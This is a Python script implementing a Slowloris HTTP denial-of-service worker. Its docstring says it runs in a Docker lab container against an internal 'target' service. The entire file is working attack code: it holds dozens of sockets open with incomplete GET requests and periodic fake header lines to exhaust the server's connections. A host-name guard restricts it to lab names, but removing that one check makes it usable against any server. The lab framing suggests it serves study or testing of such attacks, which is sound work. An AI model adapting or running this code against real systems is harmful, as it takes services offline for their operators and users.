"""
Slowloris L7 Worker (runs inside isolated Docker container `doslab_u_attacker`).
Targets strictly `target:80` inside the Docker internal network.
"""

import argparse
import random
import socket
import time


def open_socket(host: str, port: int) -> socket.socket:
    s = socket.create_connection((host, port), timeout=3.0)
    s.sendall(
        (
            f"GET /?r={random.randint(1000, 999999)} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: SlowlorisLab/1.0\r\n"
        ).encode("ascii")
    )
    return s


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="target")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--sockets", type=int, default=65)
    parser.add_argument("--interval", type=float, default=1.5)
    args = parser.parse_args()

    # Safety guard: only allow internal Docker service name
    if args.host not in ("target", "doslab_u_target"):
        raise SystemExit("Blocked non-lab target")

    pool = []
    try:
        while True:
            alive = []
            for s in pool:
                try:
                    s.sendall(f"X-Keep-Alive: {random.randint(1, 9999)}\r\n".encode("ascii"))
                    alive.append(s)
                except OSError:
                    try:
                        s.close()
                    except OSError:
                        pass
            pool = alive

            fails = 0
            while len(pool) < args.sockets:
                try:
                    pool.append(open_socket(args.host, args.port))
                except OSError:
                    fails += 1
                    if fails >= 10:
                        break
            time.sleep(args.interval)
    finally:
        for s in pool:
            try:
                s.close()
            except OSError:
                pass


if __name__ == "__main__":
    main()
